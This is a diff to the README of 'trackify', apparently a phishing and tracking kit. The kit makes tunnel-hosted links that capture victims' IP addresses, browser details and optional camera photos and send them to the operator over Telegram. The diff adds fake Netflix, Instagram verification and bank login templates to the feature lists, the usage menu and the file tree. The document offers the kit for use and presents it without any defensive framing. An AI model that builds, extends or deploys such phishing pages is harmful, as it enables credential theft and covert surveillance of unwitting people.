@@ -18,7 +18,7 @@
 **Developed by:** 0Cod3  
 
 
-[![Version](https://img.shields.io/badge/version-1.5-blue.svg)](https://github.com)
+[![Version](https://img.shields.io/badge/version-1.0-blue.svg)](https://github.com)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg)]()
 
@@ -49,7 +49,7 @@
 ### What it does:
 - Generates tracking links using various tunnel services
 - Captures IP addresses and browser information
-- Supports multiple phishing templates (YouTube Live, Google Meet, Age Verification)
+- Supports multiple phishing templates (YouTube Live, Google Meet, Age Verification, Netflix Login, Instagram Verification, Bank Login)
 - Sends real-time notifications via Telegram or saves locally
 - Optional camera capture functionality
 
@@ -59,7 +59,7 @@
 
 - 🔗 **Multiple Tunnel Services**: Ngrok, Cloudflare Tunnel, Serveo.net
 - 📱 **Telegram Integration**: Real-time notifications with bot support
-- 🎨 **Multiple Templates**: YouTube Live, Google Meet, Sensitive Video
+- 🎨 **Multiple Templates**: YouTube Live, Google Meet, Sensitive Video, Netflix Login, Instagram Verification, Bank Login
 - 📸 **Camera Capture**: Optional photo capture functionality
 - 💾 **Local Storage**: Saves captured data to files
 - 🎯 **IP Tracking**: Captures IP, User-Agent, and timestamp
@@ -148,6 +148,9 @@ The script will guide you through an interactive menu:
    - Option 1: YouTube Live (requires video ID)
    - Option 2: Google Meet
    - Option 3: Sensitive Video (Age Verification)
+   - Option 4: Netflix Login
+   - Option 5: Instagram Verification
+   - Option 6: Bank Login
 
 3. **Select Tunnel Service**
    - Option 1: Ngrok (requires authtoken)
@@ -263,6 +266,21 @@ wsl bash trackify.sh
 - Requires user interaction
 - Higher engagement rate
 
+### 4. Netflix Login Template
+- Mimics Netflix sign-in page
+- Professional login interface
+- No additional configuration needed
+
+### 5. Instagram Verification Template
+- Mimics Instagram account verification page
+- Requires camera access for verification
+- No additional configuration needed
+
+### 6. Bank Login Template
+- Mimics secure banking login portal
+- Professional banking interface
+- No additional configuration needed
+
 ---
 
 ## 🔔 Notifications
@@ -334,6 +352,9 @@ trackify/
 ├── Youtube.html        # YouTube template
 ├── Gmeet.html          # Google Meet template
 ├── Sensitive.html      # Age verification template
+├── Netflix.html        # Netflix login template
+├── Instagram.html      # Instagram verification template
+├── Bank.html           # Bank login template
 ├── index.php           # Generated redirect page
 ├── index2.html         # Generated phishing page
 ├── saved.ip.txt        # Saved IP addresses
